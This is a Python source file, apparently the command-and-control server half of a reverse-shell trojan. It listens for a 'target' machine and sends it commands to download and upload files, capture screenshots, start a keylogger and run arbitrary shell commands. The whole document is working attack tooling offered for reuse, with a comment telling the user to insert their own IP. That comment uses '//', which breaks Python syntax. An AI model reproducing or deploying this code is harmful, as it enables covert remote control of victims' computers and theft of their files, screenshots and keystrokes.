
import socket
import simplejson
import base64

count = 1


def json_send(data):
    json_data = simplejson.dumps(data)
    target.send(json_data.encode("utf-8"))


def json_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + target.recv(1024).decode()
            return simplejson.loads(json_data)
        except ValueError:
            continue


def shell():
    global count
    while True:
        comnd = input("Shell#~%s: " % str(ip))
        json_send(comnd)
        if comnd == "q":
            break
        elif comnd == "keylog_start":
            continue
        elif comnd[:8] == "download":
            with open(comnd[9:], "wb") as file:
                result = json_recv()
                file.write(base64.b64decode(result))
        elif comnd[:6] == "upload":
            try:
                with open(comnd[7:], "rb") as fin:
                    json_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to Upload"
                json_send(base64.b64encode(failed))
        elif comnd[:2] == "cd" and len(comnd) > 1:
            continue
        elif comnd[:10] == "screenshot":
            with open("screenshot%d.png" % count, "wb") as ss:
                image = json_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded[:4] == "[!!]":
                    print(image_decoded)
                else:
                    ss.write(image_decoded)
                    count += 1
        else:
            result = json_recv()
            print(result)


def server():
    global ip
    global s
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.43.147", 54321))//ADD YOUR IP ADD.
    s.listen(5)
    print("connection listening")
    target, ip = s.accept()
    print("target connected")


server()
shell()
s.close()
